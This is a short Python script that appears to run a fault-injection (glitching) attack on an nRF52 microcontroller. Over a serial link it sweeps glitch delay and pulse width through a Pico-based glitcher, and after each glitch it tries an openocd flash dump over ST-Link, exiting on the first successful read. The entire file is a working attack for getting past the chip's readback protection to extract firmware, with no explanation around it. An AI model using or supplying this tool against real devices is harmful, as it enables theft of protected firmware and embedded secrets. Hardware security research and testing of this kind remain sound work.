import time
import sys
import serial
import struct
import subprocess

try:
    ser = serial.Serial("/dev/tty.usbmodem0000000000001")
except:
    ser = serial.Serial("/dev/pico_dnd")


def set_pulse(pulse):
    ser.write(b"\x42" + struct.pack("<I", pulse))


def set_delay(delay):
    ser.write(b"\x41" + struct.pack("<I", delay))


def glitch():
    ser.write(b"\x43")


def test_stlink():
    try:
        subprocess.check_output(['openocd', '-f', 'interface/stlink.cfg', '-f', 'testnrf.cfg', '-c', 'init;dump_image nrf52_dumped2.bin 0x0 0x1000; exit'], stderr=subprocess.STDOUT)
        return True
    except:
        pass
    return False


while True:
    for delay in range(63000, 84000):
        set_delay(delay)
        for pulse in range(7, 9):
            set_pulse(pulse)

            glitch()
            time.sleep(0.05)
            if test_stlink():
                print("SUCCESS")
                sys.exit(0)
